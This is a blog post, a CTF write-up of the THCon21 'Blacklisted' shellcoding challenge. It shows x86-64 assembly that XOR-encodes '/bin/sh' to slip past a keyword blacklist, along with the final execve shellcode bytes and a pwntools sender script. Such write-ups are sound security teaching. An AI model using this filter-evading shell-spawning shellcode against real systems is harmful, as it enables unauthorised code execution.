<!doctype html><html lang=en-us><head><title>THCon21 - Blacklisted |
Cyxo's Tech Blog</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name=description content="A shellcoding challenge from THCon21
    "><meta property="og:title" content="THCon21 - Blacklisted"><meta property="og:description" content="A shellcoding challenge from THCon21"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.cyxo.cf/thcon-2021-ctf-write-ups/blacklisted/"><meta property="article:section" content="THCon-2021-CTF-Write-Ups"><meta property="article:published_time" content="2021-06-14T16:29:05+02:00"><meta property="article:modified_time" content="2021-06-14T16:29:05+02:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="THCon21 - Blacklisted"><meta name=twitter:description content="A shellcoding challenge from THCon21"><meta itemprop=name content="THCon21 - Blacklisted"><meta itemprop=description content="A shellcoding challenge from THCon21"><meta itemprop=datePublished content="2021-06-14T16:29:05+02:00"><meta itemprop=dateModified content="2021-06-14T16:29:05+02:00"><meta itemprop=wordCount content="400"><meta itemprop=keywords content="pwn,"><link rel=canonical href=https://blog.cyxo.cf/thcon-2021-ctf-write-ups/blacklisted/><link rel=icon type=image/png href=https://blog.cyxo.cf/image/favicon.ico><link rel=stylesheet href=/css/font-awesome.min.css><link rel=stylesheet href=/css/bulma.min.css><script src=/js/ramium.js></script><link rel=stylesheet href=/css/ramium.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script></head><body><nav class="navbar is-dark" role=navigation aria-label="main navigation"><div class=navbar-brand><a class=navbar-item href=/><strong>Cyxo's Tech Blog</strong></a>
<a role=button class="navbar-burger burger" aria-label=menu aria-expanded=false data-target=navbarBasicExample><span aria-hidden=true></span><span aria-hidden=true></span><span aria-hidden=true></span></a></div><div id=navbarBasicExample class=navbar-menu><div class=navbar-start><a class=navbar-item href=/>Home</a><div class="navbar-item has-dropdown is-hoverable"><a class=navbar-link>This Blog</a><div class=navbar-dropdown><a class=navbar-item href=/tags/>All Tags</a>
<a class=navbar-item href=/sections/>All Sections</a>
<a class=navbar-item href=/posts/>All Posts</a></div></div><a class=navbar-item href=/author/>Author</a></div><div class=navbar-end><a class="navbar-item navgithub" href=https://github.com/Cyxo/ target=_blank><i class="fa fa-github fa-2x"></i></a></div></div></nav><div class="columns is-centered"><div id=page-body class="column is-7"><div class="content blog"><h1>THCon21 - Blacklisted</h1><div id=infobar class="level is-mobile"><div class=level-left><div class=level-item><p class="subtitle info date">Jun 14, 2021</p></div><div class=level-item><p class="subtitle info">2 mins read</p></div></div><div class="level-right is-hidden-touch"><div class=tags><a class="tag is-dark is-rounded" href=/tags/pwn>Pwn</a></div></div></div><div class="tags is-hidden-desktop"><a class="tag is-dark is-rounded" href=/tags/pwn>Pwn</a></div><div class=blog-text><h1 id=thcon21---blacklisted>THCon21 - Blacklisted</h1><p><a href=../>Go back to write-ups list</a></p><blockquote><p><strong>Category:</strong> Intro</p><p><strong>Creator:</strong> Voydstack</p><p><strong>Description:</strong></p><p>Don&rsquo;t say the magic word !</p><p><strong>Attachments:</strong></p><ul><li><a href=/files/thcon21/blacklisted>blacklisted</a></li></ul></blockquote><h2 id=analysing-the-binary>Analysing the binary</h2><p>The attachment is an ELF x64 binary. I opened it in IDA and went to the <code>main</code> function. It basically calls <code>check_blacklist</code> on the user input, and if it returns 0,the user input will be executed as a shellcode.</p><p><em>Note: the maximum length for the shellcode is 64 bytes</em></p><p>Here is the <code>check_blacklist</code> function:</p><p><img src=/image/thcon21/check_blacklist.png alt="check_blacklist function"></p><p>And here is the blacklist that comes with it:</p><p><img src=/image/thcon21/blacklist.png alt="The blacklist"></p><p>As you can see, we can&rsquo;t use the words <code>"/bin/"</code>, <code>"/tmp/"</code>, <code>"flag.txt"</code> and <code>"sh"</code>, which is kind of annoying considering that most shellcodes just put <code>/bin/sh</code> in the right register and call the <code>execve</code> shellcode.</p><h2 id=shellcoding>Shellcoding</h2><p>The first thing I did was to copy a basic x86_64 execve('/bin/sh') shellcode which I found <a href=https://www.exploit-db.com/exploits/42179>here</a>. Now to edit the shellcode, I used an online tool (because I love online tools) to <a href=https://defuse.ca/online-x86-assembler.htm>disassemble from hex and assemble to hex online</a> which is perfect for shellcoding (and it supports 32-bit and 64-bit). I got this assembly code:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#a6e22e>push</span>   <span style=color:#66d9ef>rax</span>
<span style=color:#a6e22e>xor</span>    <span style=color:#66d9ef>rdx</span>,<span style=color:#66d9ef>rdx</span>
<span style=color:#a6e22e>xor</span>    <span style=color:#66d9ef>rsi</span>,<span style=color:#66d9ef>rsi</span>
<span style=color:#a6e22e>movabs</span> <span style=color:#66d9ef>rbx</span>,<span style=color:#ae81ff>0x68732f2f6e69622f</span>

<span style=color:#a6e22e>push</span>   <span style=color:#66d9ef>rbx</span>
<span style=color:#a6e22e>push</span>   <span style=color:#66d9ef>rsp</span>
<span style=color:#a6e22e>pop</span>    <span style=color:#66d9ef>rdi</span>
<span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>al</span>,<span style=color:#ae81ff>0x3b</span>
<span style=color:#a6e22e>syscall</span>
</code></pre></div><p>The thing moved in rbx is the hexadecimal representation of <code>hs//bin/</code> which will make the final shellcode contain both <code>/bin/</code> and <code>sh</code>, so we need to find a way to prevent this.</p><p>I decided to put in the shellcode the string <code>hs//bin/</code> xored with <code>0x4242424242424242</code> instead of putting it in plain. Now I would just need to xor it with the same value in the shellcode to recover the original string in the register. Here is how I did:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#a6e22e>push</span>   <span style=color:#66d9ef>rax</span>
<span style=color:#a6e22e>xor</span>    <span style=color:#66d9ef>rdx</span>,<span style=color:#66d9ef>rdx</span>
<span style=color:#a6e22e>xor</span>    <span style=color:#66d9ef>rsi</span>,<span style=color:#66d9ef>rsi</span>
<span style=color:#a6e22e>movabs</span> <span style=color:#66d9ef>rbx</span>,<span style=color:#ae81ff>0x2a316d6d2c2b206d</span> <span style=color:#75715e>; path xored with 0x42
</span><span style=color:#75715e></span><span style=color:#66d9ef>movabs</span> <span style=color:#66d9ef>rax</span>,<span style=color:#ae81ff>0x4242424242424242</span> <span style=color:#75715e>; xor key
</span><span style=color:#75715e></span><span style=color:#66d9ef>xor</span>    <span style=color:#66d9ef>rbx</span>,<span style=color:#66d9ef>rax</span>                <span style=color:#75715e>; we can&#39;t xor rbx with a 64 bits value directly
</span><span style=color:#75715e></span>                              <span style=color:#75715e>; so we put the value in rax first
</span><span style=color:#75715e></span><span style=color:#66d9ef>push</span>   <span style=color:#66d9ef>rbx</span>
<span style=color:#a6e22e>push</span>   <span style=color:#66d9ef>rsp</span>
<span style=color:#a6e22e>pop</span>    <span style=color:#66d9ef>rdi</span>
<span style=color:#a6e22e>xor</span>    <span style=color:#66d9ef>rax</span>,<span style=color:#66d9ef>rax</span>
<span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>al</span>,<span style=color:#ae81ff>0x3b</span>
<span style=color:#a6e22e>syscall</span>
</code></pre></div><p><em>Note: since we altered <code>rax</code> to store our xor key, we need to reset rax before setting <code>al</code>, because the <code>syscall</code> instruction seems to use the entire <code>rax</code> registry instead of just <code>al</code></em></p><p>This gives us our final shellcode :</p><pre><code>\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x6D\x20\x2B\x2C\x6D\x6D\x31\x2A\x48\xB8\x42\x42\x42\x42\x42\x42\x42\x42\x48\x31\xC3\x53\x54\x5F\x48\x31\xC0\xB0\x3B\x0F\x05
</code></pre><p>And here is a little Python script using pwntools to send the shellcode to the remote challenge:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>

conn <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#34;./blacklisted&#34;</span>)

conn<span style=color:#f92672>.</span>recv()
conn<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x6D\x20\x2B\x2C\x6D\x6D\x31\x2A\x48\xB8\x42\x42\x42\x42\x42\x42\x42\x42\x48\x31\xC3\x53\x54\x5F\x48\x31\xC0\xB0\x3B\x0F\x05</span><span style=color:#e6db74>&#34;</span>)
conn<span style=color:#f92672>.</span>interactive()
</code></pre></div><p><img src=/image/thcon21/blacklisted_solved.png alt="Script execution"></p><p><a href=../>Go back to write-ups list</a></p></div></div><div id=social-media-share class=has-text-centered><p><i>Sharing is caring!</i></p><br><div class=share-buttons><a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.cyxo.cf%2fthcon-2021-ctf-write-ups%2fblacklisted%2f" onclick="return socialMediaPopUp(this.href,'',500,500),!1" title="Share on Facebook. Opens in a new window."><img src=/img/icons/45px/facebook.png></a>
<a href="https://twitter.com/intent/tweet?text=THCon21%20-%20Blacklisted&url=https%3a%2f%2fblog.cyxo.cf%2fthcon-2021-ctf-write-ups%2fblacklisted%2f" onclick="return socialMediaPopUp(this.href,'',500,500),!1" title="Share on Twitter. Opens in a new window."><img src=/img/icons/45px/twitter.png></a>
<a href="http://www.reddit.com/submit?url=https%3a%2f%2fblog.cyxo.cf%2fthcon-2021-ctf-write-ups%2fblacklisted%2f" onclick="return socialMediaPopUp(this.href,'',900,500),!1" title="Share on Reddit. Opens in a new window."><img src=/img/icons/45px/reddit.png></a>
<a href="http://pinterest.com/pin/create/button/?url=https%3a%2f%2fblog.cyxo.cf%2fthcon-2021-ctf-write-ups%2fblacklisted%2f" onclick="return socialMediaPopUp(this.href,'',900,500),!1" title="Share on Pinterest. Opens in a new window."><img src=/img/icons/45px/pinterest.png></a>
<a href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.cyxo.cf%2fthcon-2021-ctf-write-ups%2fblacklisted%2f" onclick="return socialMediaPopUp(this.href,'',900,500),!1" title="Share on Tumblr. Opens in a new window."><img src=/img/icons/45px/tumblr.png></a>
<a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fblog.cyxo.cf%2fthcon-2021-ctf-write-ups%2fblacklisted%2f
			&title=THCon21%20-%20Blacklisted&summary=THCon21%20-%20Blacklisted%20Go%20back%20to%20write-ups%20list%0a%20Category%3a%20Intro%0aCreator%3a%20Voydstack%0aDescription%3a%0aDon%26rsquo%3bt%20say%20the%20magic%20word%20%21%0aAttachments%3a%0a%20blacklisted%20%20%20Analysing%20the%20binary%20The%20attachment%20is%20an%20ELF%20x64%20binary.%20I%20opened%20it%20in%20IDA%20and%20went%20to%20the%20main%20function.&source=rafed123.github.io" onclick="return socialMediaPopUp(this.href,'',900,500),!1" title="Share on LinkedIn. Opens in a new window."><img src=/img/icons/45px/linkedin.png></a>
<a href="mailto:?subject=THCon21%20-%20Blacklisted&body=Check out this site https%3a%2f%2fblog.cyxo.cf%2fthcon-2021-ctf-write-ups%2fblacklisted%2f" title="Share via Email. Opens in a new window."><img src=/img/icons/45px/mail.png></a></div></div><br><div id=disqus_thread></div><script type=text/javascript>(function(){var a,b;if(window.location.hostname=="localhost")return;a=document.createElement('script'),a.type='text/javascript',a.async=!0,b='',a.src='//'+b+'.disqus.com/embed.js',(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(a)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div></div><footer class="footer has-background-dark"><div class="content has-text-centered has-text-white"><p>© 2020 Ramium. Powered by
<a class=has-text-light href=https://github.com/gohugoio/hugo target=_blank>Hugo</a>. Theme
<a class=has-text-light href=https://github.com/rafed123/ramium/ target=_blank>Ramium.</a></p></div></footer></body></html>